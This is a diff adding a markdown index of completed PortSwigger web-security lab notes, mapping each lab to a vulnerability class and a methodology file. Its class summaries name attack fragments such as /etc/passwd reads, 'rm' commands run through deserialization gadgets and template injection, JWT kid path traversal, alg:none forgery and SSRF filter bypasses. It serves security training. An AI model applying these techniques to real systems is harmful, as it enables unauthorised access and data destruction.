@@ -1,0 +1,607 @@
+# PortSwigger Index
+
+This index maps completed labs and writeups to vulnerability classes
+and relevant methodology.
+
+## Labs
+
+- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+  - Note: knowledge/portswigger/labs/sql-injection-where-clause-hidden-data.md
+  - Class: SQL injection (WHERE clause, boolean tautology)
+  - Methodology: methodology/injection.md
+- SQL injection vulnerability allowing login bypass
+  - Note: knowledge/portswigger/labs/sql-injection-login-bypass.md
+  - Class: SQL injection (authentication bypass, comment-based)
+  - Methodology: methodology/injection.md
+- SQL injection attack, querying the database type and version on Oracle
+  - Note: knowledge/portswigger/labs/sql-injection-oracle-version.md
+  - Class: SQL injection (UNION-based extraction, version enumeration)
+  - Methodology: methodology/injection.md
+- SQL injection attack, querying the database type and version on MySQL and Microsoft
+  - Note: knowledge/portswigger/labs/sql-injection-mysql-version.md
+  - Class: SQL injection (UNION-based extraction, version enumeration, MySQL)
+  - Methodology: methodology/injection.md
+- SQL injection UNION attack, determining the number of columns returned by the query
+  - Note: knowledge/portswigger/labs/sql-injection-union-column-count.md
+  - Class: SQL injection (UNION attack, column-count discovery)
+  - Methodology: methodology/injection.md
+- SQL injection attack, listing the database contents on Oracle
+  - Note: knowledge/portswigger/labs/sql-injection-oracle-list-contents.md
+  - Class: SQL injection (UNION-based schema enumeration + credential extraction, Oracle)
+  - Methodology: methodology/injection.md
+- SQL injection attack, listing the database contents on non-Oracle databases
+  - Note: knowledge/portswigger/labs/sql-injection-nonoracle-list-contents.md
+  - Class: SQL injection (UNION-based schema enumeration + credential extraction, PostgreSQL)
+  - Methodology: methodology/injection.md
+- SQL injection UNION attack, finding a column containing text
+  - Note: knowledge/portswigger/labs/sql-injection-union-text-column.md
+  - Class: SQL injection (UNION attack, rendered text-column discovery)
+  - Methodology: methodology/injection.md
+- SQL injection UNION attack, retrieving data from other tables
+  - Note: knowledge/portswigger/labs/sql-injection-union-other-tables.md
+  - Class: SQL injection (UNION attack, cross-table credential extraction)
+  - Methodology: methodology/injection.md
+- SQL injection UNION attack, retrieving multiple values in a single column
+  - Note: knowledge/portswigger/labs/sql-injection-union-single-column.md
+  - Class: SQL injection (UNION attack, single-column extraction via concatenation)
+  - Methodology: methodology/injection.md
+- Blind SQL injection with conditional responses
+  - Note: knowledge/portswigger/labs/sql-injection-blind-conditional-responses.md
+  - Class: SQL injection (blind, boolean oracle via conditional response, cookie injection point)
+  - Methodology: methodology/injection.md
+- Blind SQL injection with conditional errors
+  - Note: knowledge/portswigger/labs/sql-injection-blind-conditional-errors.md
+  - Class: SQL injection (blind, conditional-error oracle via CASE/1=0, cookie injection point)
+  - Methodology: methodology/injection.md
+- Visible error-based SQL injection
+  - Note: knowledge/portswigger/labs/sql-injection-visible-error-based.md
+  - Class: SQL injection (error-based extraction via value-reflecting cast errors, cookie injection point)
+  - Methodology: methodology/injection.md
+- User role controlled by request parameter
+  - Note: knowledge/portswigger/labs/access-control-user-role-controlled-by-request-parameter.md
+  - Class: Access control (vertical escalation via forgeable Admin cookie)
+  - Methodology: methodology/access-control.md
+- Method-based access control can be circumvented
+  - Note: knowledge/portswigger/labs/access-control-method-based-circumvented.md
+  - Class: Access control (vertical escalation via verb-scoped authZ bypass, PUT body)
+  - Methodology: methodology/access-control.md
+- Multi-step process with no access control on one step
+  - Note: knowledge/portswigger/labs/access-control-multistep-missing-check.md
+  - Class: Access control (vertical escalation via unguarded confirm step, confirmed=true)
+  - Methodology: methodology/access-control.md
+- URL-based access control can be circumvented
+  - Note: knowledge/portswigger/labs/access-control-url-based-circumvented.md
+  - Class: Access control (vertical escalation via X-Original-URL rewrite bypass, anon)
+  - Methodology: methodology/access-control.md
+- Referer-based access control
+  - Note: knowledge/portswigger/labs/access-control-referer-based.md
+  - Class: Access control (vertical escalation via Referer-gated role mutation, exact panel URL)
+  - Methodology: methodology/access-control.md
+- User ID controlled by request parameter, with unpredictable user IDs
+  - Note: knowledge/portswigger/labs/access-control-user-id-unpredictable.md
+  - Class: Access control (horizontal IDOR via leaked GUID → carlos API key → submitSolution)
+  - Methodology: methodology/access-control.md
+- User ID controlled by request parameter with password disclosure
+  - Note: knowledge/portswigger/labs/access-control-user-id-password-disclosure.md
+  - Class: Access control (IDOR password disclosure → administrator login → delete carlos)
+  - Methodology: methodology/access-control.md
+- Username enumeration via subtly different responses
+  - Note: knowledge/portswigger/labs/authentication-username-enumeration-subtle-responses.md
+  - Class: Authentication (username enumeration via trailing-space typo, then password brute-force → americas:moon)
+  - Methodology: methodology/authentication.md
+- 2FA broken logic
+  - Note: knowledge/portswigger/labs/authentication-2fa-broken-logic.md
+  - Class: Authentication (2FA verify-parameter code minting + unthrottled 4-digit brute-force → carlos:1402)
+  - Methodology: methodology/authentication.md
+- Excessive trust in client-side controls
+  - Note: knowledge/portswigger/labs/business-logic-excessive-trust-client-side-controls.md
+  - Class: Business logic (client-side unit-price trust → $1337 jacket for $1.00)
+  - Methodology: methodology/business-logic.md
+- Insufficient workflow validation
+  - Note: knowledge/portswigger/labs/business-logic-insufficient-workflow-validation.md
+  - Class: Business logic (confirmation replay finalizes mutated cart → $1337 jacket at $0 charge)
+  - Methodology: methodology/business-logic.md
+- Inconsistent security controls
+  - Note: knowledge/portswigger/labs/business-logic-inconsistent-security-controls.md
+  - Class: Business logic (unverified email-change to privileged domain → admin → delete carlos)
+  - Methodology: methodology/business-logic.md
+- Weak isolation on dual-use endpoint
+  - Note: knowledge/portswigger/labs/business-logic-weak-isolation-dual-use.md
+  - Class: Business logic (dropped current-password resets anyone → administrator → delete carlos)
+  - Methodology: methodology/business-logic.md
+- High-level logic vulnerability
+  - Note: knowledge/portswigger/labs/business-logic-high-level-logic-vulnerability.md
+  - Class: Business logic (negative quantities + sign-only total guard → mixed cart jacket×1 + cheap×−21 → $8.33 charge → is-solved)
+  - Methodology: methodology/business-logic.md
+- Flawed enforcement of business rules
+  - Note: knowledge/portswigger/labs/business-logic-flawed-enforcement-of-business-rules.md
+  - Class: Business logic (adjacent-comparison coupon check → NEWCUST5/SIGNUP30 alternation → $0.00 order → is-solved)
+  - Methodology: methodology/business-logic.md
+- Low-level logic flaw
+  - Note: knowledge/portswigger/labs/business-logic-low-level-logic-flaw.md
+  - Class: Business logic (32-bit total overflow via 324×99 + 47 jackets → computed $1.17 top-up → $0.69 charge → is-solved)
+  - Methodology: methodology/business-logic.md
+- Bypassing access controls using email address parsing discrepancies
+  - Note: knowledge/portswigger/labs/business-logic-email-parsing-discrepancies.md
+  - Class: Business logic (UTF-7 encoded-word discrepancy → privileged account from unauthorized mailbox → delete carlos → is-solved)
+  - Methodology: methodology/business-logic.md
+- Inconsistent handling of exceptional input
+  - Note: knowledge/portswigger/labs/business-logic-inconsistent-handling-exceptional-input.md
+  - Class: Business logic (255-char truncation split → routable delivery + privileged storage → delete carlos → is-solved)
+  - Methodology: methodology/business-logic.md
+- Authentication bypass via flawed state machine
+  - Note: knowledge/portswigger/labs/business-logic-auth-bypass-flawed-state-machine.md
+  - Class: Business logic (drop role-selector GET with redirects off → default administrator → delete carlos → is-solved)
+  - Methodology: methodology/business-logic.md
+- Infinite money logic flaw
+  - Note: knowledge/portswigger/labs/business-logic-infinite-money-logic-flaw.md
+  - Class: Business logic (discounted gift-card buy + full-face redeem → +$3/cycle compounded to $1438 → jacket → is-solved)
+  - Methodology: methodology/business-logic.md
+- Basic SSRF against the local server
+  - Note: knowledge/portswigger/labs/ssrf-basic-local-server.md
+  - Class: SSRF (stockApi loopback fetch → internal admin → delete carlos, anon)
+  - Methodology: methodology/ssrf.md
+- Basic SSRF against another back-end system
+  - Note: knowledge/portswigger/labs/ssrf-basic-backend-system.md
+  - Class: SSRF (stockApi /24 sweep → 192.168.0.170:8080 admin → delete carlos, anon)
+  - Methodology: methodology/ssrf.md
+- SSRF with blacklist-based input filter
+  - Note: knowledge/portswigger/labs/ssrf-blacklist-filter-bypass.md
+  - Class: SSRF (blacklist bypass via 127.1 + /Admin case → loopback admin → delete carlos, anon)
+  - Methodology: methodology/ssrf.md
+- SSRF with whitelist-based input filter
+  - Note: knowledge/portswigger/labs/ssrf-whitelist-double-decode.md
+  - Class: SSRF (whitelist bypass via %2523 double-decode userinfo→fragment → loopback admin → delete carlos, anon)
+  - Methodology: methodology/ssrf.md
+- SSRF with filter bypass via open redirection vulnerability
+  - Note: knowledge/portswigger/labs/ssrf-open-redirect-chain.md
+  - Class: SSRF (relative stockApi → open nextProduct redirect → 192.168.0.12:8080 admin → delete carlos, anon)
+  - Methodology: methodology/ssrf.md
+- Blind SSRF with out-of-band detection
+  - Note: knowledge/portswigger/labs/ssrf-blind-oob-detection.md
+  - Class: SSRF (blind Referer fetch, async; Collaborator-only egress → instance attribution → solved)
+  - Methodology: methodology/ssrf.md
+- Remote code execution via web shell upload
+  - Note: knowledge/portswigger/labs/file-upload-webshell-rce.md
+  - Class: File upload (unrestricted PHP avatar → RCE as carlos → /home/carlos/secret → submit)
+  - Methodology: methodology/file-security.md
+- Web shell upload via Content-Type restriction bypass
+  - Note: knowledge/portswigger/labs/file-upload-content-type-bypass.md
+  - Class: File upload (MIME spoof image/png → same RCE chain → submit)
+  - Methodology: methodology/file-security.md
+- Web shell upload via path traversal
+  - Note: knowledge/portswigger/labs/file-upload-path-traversal.md
+  - Class: File upload (traversal filename → executing parent dir → RCE → submit)
+  - Methodology: methodology/file-security.md
+- Web shell upload via obfuscated file extension
+  - Note: knowledge/portswigger/labs/file-upload-obfuscated-extension.md
+  - Class: File upload (null-byte %00 truncation → executable .php → RCE → submit)
+  - Methodology: methodology/file-security.md
+- Web shell upload via extension blacklist bypass
+  - Note: knowledge/portswigger/labs/file-upload-extension-blacklist-bypass.md
+  - Class: File upload (unlisted .phar executes → RCE → submit)
+  - Methodology: methodology/file-security.md
+- Remote code execution via polyglot web shell upload
+  - Note: knowledge/portswigger/labs/file-upload-polyglot-rce.md
+  - Class: File upload (GIF89a+PHP polyglot → RCE → frame-stripped secret → submit)
+  - Methodology: methodology/file-security.md
+- Web shell upload via race condition
+  - Note: knowledge/portswigger/labs/file-upload-race-condition.md
+  - Class: File upload (store-then-delete race → burst execution → RCE → submit)
+  - Methodology: methodology/file-security.md
+- OS command injection, simple case
+  - Note: knowledge/portswigger/labs/os-command-injection-simple-case.md
+  - Class: OS command injection (stock param shell interpolation, exit-gated output, # trailer → /etc/passwd → solved)
+  - Methodology: methodology/injection.md
+- Blind OS command injection with time delays
+  - Note: knowledge/portswigger/labs/os-command-injection-blind-time.md
+  - Class: OS command injection (blind feedback-email sleep oracle → delay → solved)
+  - Methodology: methodology/injection.md
+- Blind OS command injection with output redirection
+  - Note: knowledge/portswigger/labs/os-command-injection-blind-redirect.md
+  - Class: OS command injection (blind email sink → redirect to images dir → exfiltrate → solved)
+  - Methodology: methodology/injection.md
+- Blind OS command injection with out-of-band interaction
+  - Note: knowledge/portswigger/labs/os-command-injection-blind-oob.md
+  - Class: OS command injection (blind email sink → Collaborator nslookup → attribution → solved)
+  - Methodology: methodology/injection.md
+- File path traversal, simple case
+  - Note: knowledge/portswigger/labs/traversal-simple-case.md
+  - Class: Path traversal (unsanitized filename → /etc/passwd display → solved)
+  - Methodology: methodology/traversal.md
+- File path traversal, traversal sequences blocked with absolute path bypass
+  - Note: knowledge/portswigger/labs/traversal-absolute-path-bypass.md
+  - Class: Path traversal (sequence block bypassed by absolute /etc/passwd → solved)
+  - Methodology: methodology/traversal.md
+- File path traversal, traversal sequences stripped non-recursively
+  - Note: knowledge/portswigger/labs/traversal-sequences-stripped-nonrecursively.md
+  - Class: Path traversal (non-recursive strip bypassed by nested ....// → solved)
+  - Methodology: methodology/traversal.md
+- File path traversal, validation of start of path
+  - Note: knowledge/portswigger/labs/traversal-validate-start-of-path.md
+  - Class: Path traversal (prefix allowlist + ../ escape → /etc/passwd → solved)
+  - Methodology: methodology/traversal.md
+- File path traversal, validation of file extension with null byte bypass
+  - Note: knowledge/portswigger/labs/traversal-extension-null-byte.md
+  - Class: Path traversal (extension allowlist + null byte + depth → /etc/passwd → solved)
+  - Methodology: methodology/traversal.md
+- Finding and exploiting an unused API endpoint
+  - Note: knowledge/portswigger/labs/api-unused-endpoint-price-patch.md
+  - Class: API security (undocumented PATCH price mutation, any-auth → global $0 → free jacket)
+  - Methodology: methodology/api-security.md
+- Exploiting an API endpoint using documentation
+  - Note: knowledge/portswigger/labs/api-docs-delete-user.md
+  - Class: API security (exposed openapi.json → documented DELETE /api/user/carlos, low-priv → 404 re-read → is-solved)
+  - Methodology: methodology/api-security.md
+- Exploiting server-side parameter pollution in a query string
+  - Note: knowledge/portswigger/labs/api-sspp-query-string.md
+  - Class: API security (forgot-password SSPP: field-selector + # truncation → admin reset_token leak → reset → login → delete carlos → is-solved)
+  - Methodology: methodology/api-security.md
+- Exploiting a mass assignment vulnerability
+  - Note: knowledge/portswigger/labs/api-mass-assignment-discount.md
+  - Class: API security (GET/POST JSON shape diff → hidden chosen_discount → type-error proof → 100% → 201 + is-solved)
+  - Methodology: methodology/api-security.md
+- Exploiting server-side parameter pollution in a REST URL
+  - Note: knowledge/portswigger/labs/api-sspp-rest-url.md
+  - Class: API security (REST path traversal → openapi definition → versioned field path → admin passwordResetToken → reset → login → delete carlos → is-solved)
+  - Methodology: methodology/api-security.md
+- Modifying serialized objects
+  - Note: knowledge/portswigger/labs/deserialization-modifying-serialized-objects.md
+  - Class: Deserialization (PHP serialized User in base64 session cookie, admin b:0→b:1 → admin panel → delete carlos)
+  - Methodology: methodology/deserialization.md
+- Using application functionality to exploit insecure deserialization
+  - Note: knowledge/portswigger/labs/deserialization-using-application-functionality.md
+  - Class: Deserialization (PHP serialized User avatar_link s:19→s:23 to /home/carlos/morale.txt → POST /my-account/delete 302 → is-solved)
+  - Methodology: methodology/deserialization.md
+- Exploiting Java deserialization with Apache Commons
+  - Note: knowledge/portswigger/labs/deserialization-java-apache-commons.md
+  - Class: Deserialization (Java rO0 AccessTokenUser + CommonsCollections4 RCE rm /home/carlos/morale.txt → 500 trigger → is-solved)
+  - Methodology: methodology/deserialization.md
+- Developing a custom gadget chain for PHP deserialization
+  - Note: knowledge/portswigger/labs/deserialization-custom-gadget-chain-php.md
+  - Class: Deserialization (custom PHP gadget CustomTemplate/DefaultMap __wakeup→__get→exec rm /home/carlos/morale.txt → 500 trigger → is-solved)
+  - Methodology: methodology/deserialization.md
+- Developing a custom gadget chain for Java deserialization
+  - Note: knowledge/portswigger/labs/deserialization-custom-gadget-chain-java.md
+  - Class: Deserialization (custom Java gadget ProductTemplate.readObject SQLi → CAST(password AS numeric) reflect → admin login → delete carlos)
+  - Methodology: methodology/deserialization.md
+- Exploiting Ruby deserialization using a documented gadget chain
+  - Note: knowledge/portswigger/labs/deserialization-ruby-universal-gadget.md
+  - Class: Deserialization (Ruby Marshal BAhv + vakzz universal chain → Kernel.system rm /home/carlos/morale.txt → 500 with sh:reading trace → is-solved)
+  - Methodology: methodology/deserialization.md
+- Exploiting PHP deserialization with a pre-built gadget chain
+  - Note: knowledge/portswigger/labs/deserialization-php-prebuilt-gadget-chain.md
+  - Class: Deserialization (signed PHP session + phpinfo SECRET_KEY + phpggc Symfony/RCE4 → system rm /home/carlos/morale.txt → 500 → is-solved)
+  - Methodology: methodology/deserialization.md
+- Basic server-side template injection
+  - Note: knowledge/portswigger/labs/ssti-basic-erb-rce.md
+  - Class: SSTI (reflected message param → ERB <%= 7*7 %>=49 → system rm /home/carlos/morale.txt=true → is-solved)
+  - Methodology: methodology/ssti.md
+- Basic server-side template injection (code context)
+  - Note: knowledge/portswigger/labs/ssti-code-context-tornado-rce.md
+  - Class: SSTI code context (stored preferred-name → Tornado expression slot → 7*7=49 → os.system rm → 0 → is-solved)
+  - Methodology: methodology/ssti.md
+- Server-side template injection using documentation
+  - Note: knowledge/portswigger/labs/ssti-freemarker-execute-rce.md
+  - Class: SSTI (privileged template editor → Freemarker ${} → ?new() Execute → rm /home/carlos/morale.txt on Preview → is-solved)
+  - Methodology: methodology/ssti.md
+- SSTI in an unknown language with a documented exploit
+  - Note: knowledge/portswigger/labs/ssti-handlebars-documented-rce.md
+  - Class: SSTI (reflected message → Handlebars/Node → #with/constructor chain → child_process.exec rm → is-solved)
+  - Methodology: methodology/ssti.md
+- Server-side template injection with a custom exploit
+  - Note: knowledge/portswigger/labs/ssti-twig-custom-exploit-user-object.md
+  - Class: SSTI (stored preference → Twig user.setAvatar symlink + gdprDelete → delete /home/carlos/.ssh/id_rsa → is-solved)
+  - Methodology: methodology/ssti.md
+- Exploiting XXE using external entities to retrieve files
+  - Note: knowledge/portswigger/labs/xxe-external-entity-file-retrieval.md
+  - Class: XXE (XML stockCheck → file:///etc/passwd entity in productId → Invalid product ID reflects file → is-solved)
+  - Methodology: methodology/xxe.md
+- Exploiting XXE to perform SSRF attacks
+  - Note: knowledge/portswigger/labs/xxe-ssrf-metadata-credentials.md
+  - Class: XXE→SSRF (XML stockCheck → http://169.254.169.254 entity → metadata drill to admin creds → is-solved)
+  - Methodology: methodology/xxe.md (targets: methodology/ssrf.md)
+- Blind XXE with out-of-band interaction
+  - Note: knowledge/portswigger/labs/xxe-blind-oob-interaction.md
+  - Class: XXE blind OOB (XML stockCheck → http Collaborator entity → 65s wait → is-solved by attribution)
+  - Methodology: methodology/xxe.md
+- Blind XXE with out-of-band interaction via XML parameter entities
+  - Note: knowledge/portswigger/labs/xxe-blind-oob-parameter-entities.md
+  - Class: XXE blind OOB (general entities blocked → %xxe; parameter entity → 70s wait → is-solved)
+  - Methodology: methodology/xxe.md
+- Exploiting XXE via image file upload
+  - Note: knowledge/portswigger/labs/xxe-svg-avatar-file-upload.md
+  - Class: XXE (SVG avatar entity → Batik pixels → visual hostname → submit → correct:true → is-solved)
+  - Methodology: methodology/xxe.md
+- Exploiting XInclude to retrieve files
+  - Note: knowledge/portswigger/labs/xxe-xinclude-file-retrieval.md
+  - Class: XXE (form stockCheck → in-value xi:include file:///etc/passwd → Invalid product ID reflects file → is-solved)
+  - Methodology: methodology/xxe.md
+- Discovering vulnerabilities quickly with targeted scanning (XInclude variant)
+  - Note: knowledge/portswigger/labs/xxe-targeted-scanning-stock-xinclude.md
+  - Class: XXE (same in-value XInclude shape on /product/stock productId → passwd in error → is-solved; storeId numerics recorded unchased)
+  - Methodology: methodology/xxe.md (no update — fully covered)
+- Exploiting blind XXE to retrieve data via error messages
+  - Note: knowledge/portswigger/labs/xxe-blind-error-based-exfiltration.md
+  - Class: XXE blind error-exfil (external DTD file/eval/exfil trio → FileNotFoundException embeds file → is-solved)
+  - Methodology: methodology/xxe.md
+- Exploiting blind XXE to exfiltrate data using a malicious external DTD
+  - Note: knowledge/portswigger/labs/xxe-blind-oob-exfiltration-dtd.md
+  - Class: XXE blind OOB exfil (external DTD → file in exfil URL → access log → submit → correct:true → is-solved)
+  - Methodology: methodology/xxe.md
+- Exploiting XXE to retrieve data by repurposing a local DTD
+  - Note: knowledge/portswigger/labs/xxe-local-dtd-repurposing.md
+  - Class: XXE (local docbookx.dtd ISOamso redefinition → FileNotFoundException embeds file → is-solved)
+  - Methodology: methodology/xxe.md
+- Username enumeration via different responses
+  - Note: knowledge/portswigger/labs/authentication-username-enumeration-different-responses.md
+  - Class: Authentication (overt Invalid username vs Incorrect password → agenda:princess → is-solved)
+  - Methodology: methodology/authentication.md
+- 2FA simple bypass
+  - Note: knowledge/portswigger/labs/authentication-2fa-simple-bypass.md
+  - Class: Authentication (stage-1 session serves account pages, 2FA skippable → carlos:montoya → victim page → is-solved)
+  - Methodology: methodology/authentication.md
+- Password reset broken logic
+  - Note: knowledge/portswigger/labs/authentication-password-reset-broken-logic.md
+  - Class: Authentication (own reset token + username=carlos → victim password overwrite → login → is-solved)
+  - Methodology: methodology/authentication.md
+- Broken brute-force protection, IP block
+  - Note: knowledge/portswigger/labs/authentication-broken-bruteforce-protection-ip-block.md
+  - Class: Authentication (3-strike IP counter reset by any successful login → 2:1 carlos/wiener cycling → carlos:ranger → is-solved)
+  - Methodology: methodology/authentication.md
+- Username enumeration via response timing
+  - Note: knowledge/portswigger/labs/authentication-username-enumeration-response-timing.md
+  - Class: Authentication (long-password hash-delay oracle + XFF counter partitioning → apache:dragon → is-solved)
+  - Methodology: methodology/authentication.md
+- Authentication bypass via encryption oracle
+  - Note: knowledge/portswigger/labs/authentication-bypass-encryption-oracle.md
+  - Class: Authentication (comment encrypt/decrypt oracle pair → username:timestamp learn → ECB excise administrator forgery → sessionless admin → delete carlos → is-solved)
+  - Methodology: methodology/authentication.md
+- Basic password reset poisoning
+  - Note: knowledge/portswigger/labs/authentication-basic-password-reset-poisoning.md
+  - Class: Authentication (Host-spoofed victim reset → bot click in access log → fast token submit → carlos login → is-solved)
+  - Methodology: methodology/authentication.md
+- 2FA broken logic (cookie-mint instance)
+  - Note: knowledge/portswigger/labs/authentication-2fa-broken-logic-0a17001e.md
+  - Class: Authentication (cookie-keyed code mint + sessionless verification → verify=carlos + 0048 → is-solved)
+  - Methodology: methodology/authentication.md
+- Brute-forcing a stay-logged-in cookie
+  - Note: knowledge/portswigger/labs/authentication-bruteforcing-stay-logged-in-cookie.md
+  - Class: Authentication (unsigned base64(username:md5(password)) token → offline forge → carlos:george → is-solved)
+  - Methodology: methodology/authentication.md
+- JWT authentication bypass via unverified signature
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-unverified-signature.md
+  - Class: JWT (unverified signature → sub=administrator forgery → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via flawed signature verification
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-flawed-signature-verification.md
+  - Class: JWT (claim-only 401 → alg:none accepted → sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via weak signing key
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-weak-signing-key.md
+  - Class: JWT (claim-only 401, alg:none 401 → hashcat secret1 → valid-signed sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via jwk header injection
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-jwk-header-injection.md
+  - Class: JWT (claim-only/alg-none/loose-JWK 401s → strict-shape embedded JWK → sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via kid header path traversal
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-kid-header-path-traversal.md
+  - Class: JWT (claim-only/alg-none 401s → kid ../../../dev/null + empty-key HS256 → sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via jku header injection
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-jku-header-injection.md
+  - Class: JWT (claim-only/alg-none 401s → hosted JWKS + jku + RS256 self-sign → sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via algorithm confusion
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-algorithm-confusion.md
+  - Class: JWT (claim-only/alg-none 401s → jwks.json public key + HS256/PEM confusion → sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- JWT authentication bypass via algorithm confusion with no exposed key
+  - Note: knowledge/portswigger/labs/jwt-authentication-bypass-algorithm-confusion-no-exposed-key.md
+  - Class: JWT (8 falsifications → GCD modulus recovery from 2 signatures → PEM-envelope HS256 confusion → sub=administrator → delete carlos → is-solved)
+  - Methodology: methodology/jwt.md
+- Scanning non-standard data structures
+  - Note: knowledge/portswigger/labs/xss-scanning-non-standard-data-structures.md
+  - Class: XSS (stored XSS in session-cookie username half → blind victim-side fetch deletes carlos, no receiver → is-solved)
+  - Methodology: methodology/xss.md
+- Authentication bypass via OAuth implicit flow
+  - Note: knowledge/portswigger/labs/oauth-authentication-bypass-implicit-flow.md
+  - Class: OAuth (username-spoof ignored, garbage-token 500 → victim-email + own token → carlos render → is-solved)
+  - Methodology: methodology/oauth-sso.md
+- Forced OAuth profile linking
+  - Note: knowledge/portswigger/labs/oauth-forced-profile-linking.md
+  - Class: OAuth (stateless /oauth-linking CSRF → victim binds attacker IdP identity → self-login renders administrator → delete carlos → is-solved)
+  - Methodology: methodology/oauth-sso.md
+- Information disclosure in error messages
+  - Note: knowledge/portswigger/labs/info-disclosure-error-messages-framework-version.md
+  - Class: Info disclosure (quote probe → verbose Java trace → Apache Struts 2 2.3.31 → submitSolution correct:true → is-solved)
+  - Methodology: methodology/reconnaissance.md (no update — covered)
+- Information disclosure on debug page
+  - Note: knowledge/portswigger/labs/info-disclosure-debug-page-secret-key.md
+  - Class: Info disclosure (/cgi-bin/phpinfo.php 200/69KB → SECRET_KEY grep → submitSolution correct:true → is-solved)
+  - Methodology: methodology/reconnaissance.md (no update — covered)
+- Authentication bypass via information disclosure
+  - Note: knowledge/portswigger/labs/infoleak-authentication-bypass-trace-header.md
+  - Class: Access control (TRACE echo discloses X-Custom-IP-Authorization → 127.0.0.1 spoof → admin → delete carlos → is-solved)
+  - Methodology: methodology/access-control.md
+- Source code disclosure via backup files
+  - Note: knowledge/portswigger/labs/info-disclosure-backup-files-source-code.md
+  - Class: Info disclosure (robots → /backup listing → .bak Java source → DB password → submitSolution correct:true → is-solved)
+  - Methodology: methodology/reconnaissance.md (no update — covered)
+- Information disclosure in version control history
+  - Note: knowledge/portswigger/labs/info-disclosure-version-control-history.md
+  - Class: Info disclosure (.git logs → pre-removal commit → tree → blob → ADMIN_PASSWORD → administrator login → delete carlos → is-solved)
+  - Methodology: methodology/reconnaissance.md
+- Host header authentication bypass
+  - Note: knowledge/portswigger/labs/host-header-authentication-bypass.md
+  - Class: Access control (Host-header locality trust → Host: localhost → admin → delete carlos → is-solved, sessionless)
+  - Methodology: methodology/access-control.md
+- Limit overrun race conditions
+  - Note: knowledge/portswigger/labs/race-conditions-limit-overrun.md
+  - Class: Race conditions (non-atomic coupon check-then-set → h2-multiplexed ~16× stacking → $1337 jacket at $37.62 → checkout + confirmation → is-solved)
+  - Methodology: methodology/race-conditions.md
+- Bypassing rate limits via race conditions
+  - Note: knowledge/portswigger/labs/race-conditions-bypassing-rate-limits.md
+  - Class: Race conditions (per-username 3-strike counter raced via h2 single-packet 30-password burst → exactly one 302 qwerty → wait-reset login → admin → delete carlos → is-solved)
+  - Methodology: methodology/race-conditions.md
+- Multi-endpoint race conditions
+  - Note: knowledge/portswigger/labs/race-conditions-multi-endpoint.md
+  - Class: Race conditions (cart-mutation vs order-validation multi-endpoint collision → $10-validated order confirms $1337 jacket → overdraft → is-solved)
+  - Methodology: methodology/race-conditions.md
+- Single-endpoint race conditions
+  - Note: knowledge/portswigger/labs/race-conditions-single-endpoint.md
+  - Class: Race conditions (email-change send/render split → misdirected victim token to attacker inbox → claim admin address → delete carlos → is-solved)
+  - Methodology: methodology/race-conditions.md
+- CSRF vulnerability with no defenses
+  - Note: knowledge/portswigger/labs/csrf-no-defenses.md
+  - Class: CSRF (tokenless email change + SameSite=None → auto-submit exploit → victim visit → is-solved)
+  - Methodology: methodology/csrf.md
+
+## Writeups
+
+## Vulnerability Classes
+
+- SQL injection → methodology/injection.md
+  - Labs: sql-injection-where-clause-hidden-data, sql-injection-login-bypass, sql-injection-oracle-version, sql-injection-mysql-version, sql-injection-union-column-count, sql-injection-oracle-list-contents, sql-injection-nonoracle-list-contents, sql-injection-union-text-column, sql-injection-union-other-tables, sql-injection-union-single-column, sql-injection-blind-conditional-responses, sql-injection-blind-conditional-errors, sql-injection-visible-error-based
+- OS command injection → methodology/injection.md
+  - Labs: os-command-injection-simple-case, os-command-injection-blind-time, os-command-injection-blind-redirect, os-command-injection-blind-oob
+- Access control → methodology/access-control.md
+  - Labs: access-control-user-role-controlled-by-request-parameter, access-control-method-based-circumvented, access-control-multistep-missing-check, access-control-url-based-circumvented, access-control-referer-based, access-control-user-id-unpredictable, access-control-user-id-password-disclosure, infoleak-authentication-bypass-trace-header, host-header-authentication-bypass
+- Authentication → methodology/authentication.md
+  - Labs: authentication-username-enumeration-subtle-responses, authentication-username-enumeration-different-responses, authentication-2fa-broken-logic, authentication-2fa-simple-bypass, authentication-password-reset-broken-logic, authentication-broken-bruteforce-protection-ip-block, authentication-username-enumeration-response-timing, authentication-2fa-broken-logic-0a17001e, authentication-bruteforcing-stay-logged-in-cookie, authentication-bypass-encryption-oracle, authentication-basic-password-reset-poisoning
+- File security → methodology/file-security.md
+  - Labs: file-upload-webshell-rce, file-upload-content-type-bypass, file-upload-path-traversal, file-upload-obfuscated-extension, file-upload-extension-blacklist-bypass, file-upload-polyglot-rce, file-upload-race-condition
+- Traversal → methodology/traversal.md
+  - Labs: traversal-simple-case, traversal-absolute-path-bypass, traversal-sequences-stripped-nonrecursively, traversal-validate-start-of-path, traversal-extension-null-byte
+- Business logic → methodology/business-logic.md
+  - Labs: business-logic-excessive-trust-client-side-controls, business-logic-insufficient-workflow-validation, business-logic-inconsistent-security-controls, business-logic-weak-isolation-dual-use, business-logic-high-level-logic-vulnerability, business-logic-flawed-enforcement-of-business-rules, business-logic-low-level-logic-flaw, business-logic-email-parsing-discrepancies, business-logic-inconsistent-handling-exceptional-input, business-logic-auth-bypass-flawed-state-machine, business-logic-infinite-money-logic-flaw
+- SSRF → methodology/ssrf.md
+  - Labs: ssrf-basic-local-server, ssrf-basic-backend-system, ssrf-blacklist-filter-bypass, ssrf-whitelist-double-decode, ssrf-open-redirect-chain, ssrf-blind-oob-detection
+- API security → methodology/api-security.md
+  - Labs: api-unused-endpoint-price-patch, api-docs-delete-user, api-sspp-query-string, api-mass-assignment-discount, api-sspp-rest-url
+- SSTI → methodology/ssti.md
